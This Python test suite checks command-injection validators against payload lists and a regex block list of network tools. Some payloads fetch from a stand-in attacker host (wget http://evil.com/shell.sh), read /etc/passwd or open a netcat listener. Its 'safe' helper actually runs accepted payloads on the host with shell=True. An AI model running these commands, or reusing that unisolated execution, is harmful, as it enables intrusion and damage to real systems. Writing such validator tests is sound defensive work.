#!/usr/bin/env python3
"""
Enhanced Command Injection Security Tests
Comprehensive testing for shell command injection prevention including advanced bypass techniques
"""

import pytest
import subprocess
import os
import tempfile
import shlex
import re
import time
import uuid
from typing import Dict, List, Any, Optional, Tuple
from unittest.mock import Mock, patch, MagicMock
import platform
import asyncio


class EnhancedCommandInjectionTester:
    """Advanced command injection testing framework"""
    
    def __init__(self):
        self.os_type = platform.system().lower()
        self.test_results = []
        self.vulnerability_count = 0
        
        # Platform-specific payloads
        self.command_injection_payloads = self._generate_platform_payloads()
        
    def _generate_platform_payloads(self) -> Dict[str, List[str]]:
        """Generate platform-specific command injection payloads"""
        
        common_payloads = [
            # Basic command separators
            "; echo INJECTED",
            "&& echo INJECTED", 
            "|| echo INJECTED",
            "| echo INJECTED",
            
            # Command substitution
            "`echo INJECTED`",
            "$(echo INJECTED)",
            "${echo INJECTED}",
            
            # Nested quotes and escapes
            "'`echo INJECTED`'",
            "\"$(echo INJECTED)\"",
            "\"; echo INJECTED; \"",
            "'; echo INJECTED; '",
            
            # Null byte injection
            "\\x00; echo INJECTED",
            "\\0; echo INJECTED",
            "\x00echo INJECTED",
            
            # Unicode and encoding bypasses
            "\u003B echo INJECTED",  # Unicode semicolon
            "%3B echo INJECTED",     # URL encoded semicolon
            "%0A echo INJECTED",     # URL encoded newline
            
            # Environment variable manipulation
            "${PATH}; echo INJECTED",
            "$HOME; echo INJECTED",
            "$(env); echo INJECTED",
        ]
        
        if self.os_type == "windows":
            windows_payloads = [
                # Windows command separators
                "& echo INJECTED",
                "&& echo INJECTED",
                "|| echo INJECTED",
                
                # Windows command substitution
                "& for /f %i in ('echo INJECTED') do @echo %i",
                "& powershell.exe -Command \"Write-Host INJECTED\"",
                
                # Windows path traversal
                "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
                "& dir C:\\",
                
                # Windows batch commands
                "& call echo INJECTED",
                "& start /B echo INJECTED",
                
                # PowerShell injection
                "; powershell -Command echo INJECTED",
                "| powershell -EncodedCommand ZQBjAGgAbwAgAEkATgBKAEUAQwBUAEUARAA=",  # "echo INJECTED" in Base64
            ]
            common_payloads.extend(windows_payloads)
        else:
            # Unix/Linux payloads
            unix_payloads = [
                # Unix-specific separators
                "; /bin/echo INJECTED",
                "&& /bin/echo INJECTED",
                "|| /bin/echo INJECTED",
                "| /bin/echo INJECTED",
                
                # Process substitution
                "<(echo INJECTED)",
                ">(echo INJECTED)",
                
                # Here documents
                "<<< 'echo INJECTED'",
                "<< EOF\necho INJECTED\nEOF",
                
                # Shell expansion
                "{echo,INJECTED}",
                "$(echo INJECTED)",
                "`echo INJECTED`",
                
                # File system access
                "; cat /etc/passwd",
                "; ls -la /",
                "; id",
                "; whoami",
                
                # Network access attempts
                "; nc -l 8080",
                "; wget http://evil.com/shell.sh",
                "; curl http://evil.com",
                
                # Process manipulation
                "; ps aux",
                "; kill -9 $$",
                "; nohup echo INJECTED &",
            ]
            common_payloads.extend(unix_payloads)
            
        return {
            "basic": common_payloads,
            "advanced": self._generate_advanced_payloads(),
            "evasion": self._generate_evasion_payloads(),
            "polyglot": self._generate_polyglot_payloads()
        }
    
    def _generate_advanced_payloads(self) -> List[str]:
        """Generate advanced command injection payloads"""
        return [
            # Time-based detection
            "; sleep 5 && echo INJECTED",
            "&& timeout 5 echo INJECTED",
            
            # Error-based detection
            "; echo INJECTED >&2",
            "2>&1; echo INJECTED",
            
            # File-based detection
            "; echo INJECTED > /tmp/injection_test",
            "&& echo INJECTED >> /tmp/injection_test",
            
            # Network-based detection
            "; ping -c 1 127.0.0.1 && echo INJECTED",
            
            # Memory-based attacks
            "; python -c \"import os; os.system('echo INJECTED')\"",
            "; ruby -e \"system('echo INJECTED')\"",
            "; php -r \"system('echo INJECTED');\"",
            
            # Binary execution
            "; /bin/sh -c 'echo INJECTED'",
            "; exec echo INJECTED",
            
            # Complex chaining
            "; (echo INJECTED) && (echo CONFIRMED)",
            "; { echo INJECTED; echo CONFIRMED; }",
        ]
    
    def _generate_evasion_payloads(self) -> List[str]:
        """Generate evasion technique payloads"""
        return [
            # Quote evasion
            "'; echo 'INJECTED'; '",
            '\"; echo \"INJECTED\"; \"',
            "\\'; echo INJECTED; \\'",
            
            # Concatenation evasion  
            "'; echo 'INJ'+'ECTED'; '",
            "; echo INJ$(echo ECTED)",
            "; echo INJ`echo ECTED`",
            
            # Variable evasion
            "; A=INJ; B=ECTED; echo $A$B",
            "; export X=INJECTED; echo $X",
            
            # Base64 evasion
            "; echo SW5qZWN0ZWQ= | base64 -d",  # "Injected" in base64
            
            # Hex evasion
            "; echo -e '\\x49\\x4e\\x4a\\x45\\x43\\x54\\x45\\x44'",  # "INJECTED" in hex
            
            # Unicode evasion
            "; printf '\\u0049\\u004e\\u004a\\u0045\\u0043\\u0054\\u0045\\u0044'",
            
            # Arithmetic evasion
            "; echo $((49*1000000+78*10000+74*100+69))CTED",
            
            # Case manipulation
            "; echo injected | tr '[:lower:]' '[:upper:]'",
            
            # Wildcard evasion
            "; echo /bin/ec*o INJECTED",
            "; /*/echo INJECTED",
            
            # Process substitution evasion
            "; cat <(echo INJECTED)",
        ]
    
    def _generate_polyglot_payloads(self) -> List[str]:
        """Generate polyglot payloads that work across multiple contexts"""
        return [
            # Shell + JavaScript
            "\"; system('echo INJECTED'); //",
            "'; exec('echo INJECTED'); #",
            
            # Shell + SQL
            "'; SELECT 'INJECTED'; EXEC xp_cmdshell('echo INJECTED'); --",
            
            # Shell + Python
            "\"; __import__('os').system('echo INJECTED'); #",
            
            # Shell + Template injection
            "{{7*7}}; echo INJECTED",
            "${7*7}; echo INJECTED",
            "#{7*7}; echo INJECTED",
            
            # Multi-protocol
            "javascript:alert('INJECTED');//; echo INJECTED",
            "data:text/html,<script>alert('INJECTED')</script>; echo INJECTED",
        ]
    
    def test_basic_command_injection_protection(self, command_validator) -> List[Dict[str, Any]]:
        """Test basic command injection protection"""
        vulnerabilities = []
        
        for payload in self.command_injection_payloads["basic"]:
            try:
                # Test with mock command validator
                is_safe = command_validator.validate_command(payload)
                
                if is_safe:
                    # If validator says it's safe, try to execute (in safe environment)
                    result = self._safe_command_test(payload)
                    
                    if result and "INJECTED" in result:
                        vulnerabilities.append({
                            "type": "basic_injection",
                            "severity": "HIGH",
                            "payload": payload,
                            "description": "Basic command injection bypass detected"
                        })
                        
            except Exception as e:
                # Command validation should not crash
                vulnerabilities.append({
                    "type": "validation_error",
                    "severity": "MEDIUM",
                    "payload": payload,
                    "error": str(e),
                    "description": "Command validation failed with exception"
                })
                
        return vulnerabilities
    
    def test_advanced_command_injection_protection(self, command_validator) -> List[Dict[str, Any]]:
        """Test advanced command injection protection"""
        vulnerabilities = []
        
        for payload in self.command_injection_payloads["advanced"]:
            try:
                is_safe = command_validator.validate_command(payload)
                
                if is_safe:
                    result = self._safe_command_test(payload, timeout=10)
                    
                    if result and ("INJECTED" in result or "CONFIRMED" in result):
                        vulnerabilities.append({
                            "type": "advanced_injection",
                            "severity": "CRITICAL",
                            "payload": payload,
                            "description": "Advanced command injection bypass detected"
                        })
                        
            except Exception as e:
                vulnerabilities.append({
                    "type": "advanced_validation_error",
                    "severity": "MEDIUM", 
                    "payload": payload,
                    "error": str(e)
                })
                
        return vulnerabilities
    
    def test_command_injection_evasion_techniques(self, command_validator) -> List[Dict[str, Any]]:
        """Test command injection evasion technique protection"""
        vulnerabilities = []
        
        for payload in self.command_injection_payloads["evasion"]:
            try:
                is_safe = command_validator.validate_command(payload)
                
                if is_safe:
                    result = self._safe_command_test(payload)
                    
                    if result and ("INJECTED" in result or "Injected" in result):
                        vulnerabilities.append({
                            "type": "evasion_bypass",
                            "severity": "HIGH",
                            "payload": payload,
                            "description": "Command injection evasion technique successful"
                        })
                        
            except Exception as e:
                vulnerabilities.append({
                    "type": "evasion_validation_error",
                    "severity": "LOW",
                    "payload": payload,
                    "error": str(e)
                })
                
        return vulnerabilities
    
    def test_polyglot_injection_protection(self, command_validator) -> List[Dict[str, Any]]:
        """Test polyglot injection protection"""
        vulnerabilities = []
        
        for payload in self.command_injection_payloads["polyglot"]:
            try:
                is_safe = command_validator.validate_command(payload)
                
                if is_safe:
                    result = self._safe_command_test(payload)
                    
                    if result and "INJECTED" in result:
                        vulnerabilities.append({
                            "type": "polyglot_injection",
                            "severity": "CRITICAL",
                            "payload": payload,
                            "description": "Polyglot injection attack successful"
                        })
                        
            except Exception as e:
                vulnerabilities.append({
                    "type": "polyglot_validation_error",
                    "severity": "LOW",
                    "payload": payload,
                    "error": str(e)
                })
                
        return vulnerabilities
    
    def test_environment_variable_injection(self, command_validator) -> List[Dict[str, Any]]:
        """Test environment variable injection attacks"""
        vulnerabilities = []
        
        # Test environment variable manipulation
        env_payloads = [
            "test; export MALICIOUS=injected; echo $MALICIOUS",
            "test && PATH=/tmp:$PATH && echo INJECTED",
            "test; HOME=/tmp; cd $HOME; echo INJECTED",
            "test; LD_PRELOAD=/tmp/malicious.so; echo INJECTED",
            "test; unset PATH; echo INJECTED",
        ]
        
        for payload in env_payloads:
            try:
                is_safe = command_validator.validate_command(payload)
                
                if is_safe:
                    # Test with environment isolation
                    result = self._safe_command_test(payload, clean_env=False)
                    
                    if result and ("INJECTED" in result or "injected" in result):
                        vulnerabilities.append({
                            "type": "env_var_injection",
                            "severity": "HIGH",
                            "payload": payload,
                            "description": "Environment variable injection successful"
                        })
                        
            except Exception as e:
                continue
                
        return vulnerabilities
    
    def test_shell_metacharacter_filtering(self, command_validator) -> List[Dict[str, Any]]:
        """Test shell metacharacter filtering effectiveness"""
        vulnerabilities = []
        
        # Critical shell metacharacters
        metacharacters = [
            ';', '&', '|', '`', '$', '(', ')', '{', '}', '[', ']',
            '<', '>', '"', "'", '\\', '*', '?', '~', '!', '#'
        ]
        
        for char in metacharacters:
            test_payloads = [
                f"test{char}echo INJECTED",
                f"test {char} echo INJECTED", 
                f"test{char}{char}echo INJECTED",
                f"test{char} echo INJECTED {char}",
            ]
            
            for payload in test_payloads:
                try:
                    is_safe = command_validator.validate_command(payload)
                    
                    if is_safe and char in payload:
                        result = self._safe_command_test(payload)
                        
                        if result and "INJECTED" in result:
                            vulnerabilities.append({
                                "type": "metacharacter_bypass",
                                "severity": "HIGH",
                                "character": char,
                                "payload": payload,
                                "description": f"Shell metacharacter '{char}' not properly filtered"
                            })
                            
                except Exception:
                    continue
                    
        return vulnerabilities
    
    def test_command_length_and_complexity_limits(self, command_validator) -> List[Dict[str, Any]]:
        """Test command length and complexity protection"""
        vulnerabilities = []
        
        # Test extremely long commands
        long_command = "echo " + "A" * 10000 + "; echo INJECTED"
        
        try:
            is_safe = command_validator.validate_command(long_command)
            
            if is_safe:
                vulnerabilities.append({
                    "type": "length_limit_bypass",
                    "severity": "MEDIUM",
                    "description": f"Extremely long command ({len(long_command)} chars) accepted"
                })
                
        except Exception:
            pass  # Expected to be rejected
        
        # Test deeply nested commands
        nested_command = "echo " + "$(echo " * 100 + "INJECTED" + ")" * 100
        
        try:
            is_safe = command_validator.validate_command(nested_command)
            
            if is_safe:
                vulnerabilities.append({
                    "type": "complexity_limit_bypass",
                    "severity": "MEDIUM", 
                    "description": "Deeply nested command structure accepted"
                })
                
        except Exception:
            pass  # Expected to be rejected
            
        return vulnerabilities
    
    def _safe_command_test(self, payload: str, timeout: int = 5, clean_env: bool = True) -> Optional[str]:
        """Safely test command payload in isolated environment"""
        try:
            # Create isolated environment
            env = {} if clean_env else os.environ.copy()
            
            # Use timeout to prevent hanging
            result = subprocess.run(
                payload,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                env=env,
                cwd=tempfile.gettempdir()
            )
            
            return result.stdout + result.stderr
            
        except subprocess.TimeoutExpired:
            return "TIMEOUT"
        except Exception:
            return None
    
    def run_comprehensive_command_injection_tests(self, command_validator) -> Dict[str, Any]:
        """Run all command injection security tests"""
        test_methods = [
            self.test_basic_command_injection_protection,
            self.test_advanced_command_injection_protection,
            self.test_command_injection_evasion_techniques,
            self.test_polyglot_injection_protection,
            self.test_environment_variable_injection,
            self.test_shell_metacharacter_filtering,
            self.test_command_length_and_complexity_limits
        ]
        
        all_vulnerabilities = []
        test_results = {}
        
        for test_method in test_methods:
            test_name = test_method.__name__
            print(f"Running {test_name}...")
            
            try:
                vulnerabilities = test_method(command_validator)
                all_vulnerabilities.extend(vulnerabilities)
                
                test_results[test_name] = {
                    "status": "COMPLETED",
                    "vulnerabilities": len(vulnerabilities),
                    "details": vulnerabilities
                }
                
            except Exception as e:
                test_results[test_name] = {
                    "status": "ERROR",
                    "error": str(e)
                }
        
        # Generate summary
        critical_vulns = len([v for v in all_vulnerabilities if v.get("severity") == "CRITICAL"])
        high_vulns = len([v for v in all_vulnerabilities if v.get("severity") == "HIGH"])
        medium_vulns = len([v for v in all_vulnerabilities if v.get("severity") == "MEDIUM"])
        
        summary = {
            "total_tests": len(test_methods),
            "total_payloads_tested": sum(len(payloads) for payloads in self.command_injection_payloads.values()),
            "total_vulnerabilities": len(all_vulnerabilities),
            "critical_vulnerabilities": critical_vulns,
            "high_vulnerabilities": high_vulns, 
            "medium_vulnerabilities": medium_vulns,
            "platform": self.os_type,
            "security_score": max(0, 100 - (critical_vulns * 30 + high_vulns * 20 + medium_vulns * 10))
        }
        
        return {
            "summary": summary,
            "test_results": test_results,
            "vulnerabilities": all_vulnerabilities,
            "timestamp": time.time()
        }


# Mock command validator for testing
class MockCommandValidator:
    """Mock command validator with configurable security levels"""
    
    def __init__(self, security_level: str = "medium"):
        self.security_level = security_level
        self.blocked_patterns = self._get_blocked_patterns()
    
    def _get_blocked_patterns(self) -> List[str]:
        """Get blocked patterns based on security level"""
        if self.security_level == "low":
            return [r';\s*rm', r';\s*del']  # Very basic
        elif self.security_level == "medium":
            return [r'[;&|`$()]', r'echo.*INJECTED']
        else:  # high
            return [
                r'[;&|`$(){}<>"\']',  # All shell metacharacters
                r'echo.*INJECTED',
                r'\b(rm|del|format|fdisk|dd)\b',
                r'(wget|curl|nc|netcat)',
                r'(python|ruby|php|perl)\s+-[ce]'
            ]
    
    def validate_command(self, command: str) -> bool:
        """Validate command against blocked patterns"""
        for pattern in self.blocked_patterns:
            if re.search(pattern, command, re.IGNORECASE):
                return False
        return True


# Test execution
def test_enhanced_command_injection_protection():
    """Enhanced command injection protection test suite"""
    
    # Test with different security levels
    security_levels = ["low", "medium", "high"]
    
    for level in security_levels:
        print(f"\n=== Testing with {level.upper()} security level ===")
        
        tester = EnhancedCommandInjectionTester()
        validator = MockCommandValidator(security_level=level)
        
        results = tester.run_comprehensive_command_injection_tests(validator)
        
        print(f"Security Level: {level}")
        print(f"Platform: {results['summary']['platform']}")
        print(f"Security Score: {results['summary']['security_score']}/100")
        print(f"Total Vulnerabilities: {results['summary']['total_vulnerabilities']}")
        print(f"Critical: {results['summary']['critical_vulnerabilities']}")
        print(f"High: {results['summary']['high_vulnerabilities']}")
        print(f"Medium: {results['summary']['medium_vulnerabilities']}")
        
        # High security level should have minimal vulnerabilities
        if level == "high":
            assert results['summary']['critical_vulnerabilities'] == 0, \
                f"Critical command injection vulnerabilities found with high security"
            
            assert results['summary']['security_score'] >= 70, \
                f"Security score too low with high security: {results['summary']['security_score']}"


if __name__ == "__main__":
    test_enhanced_command_injection_protection()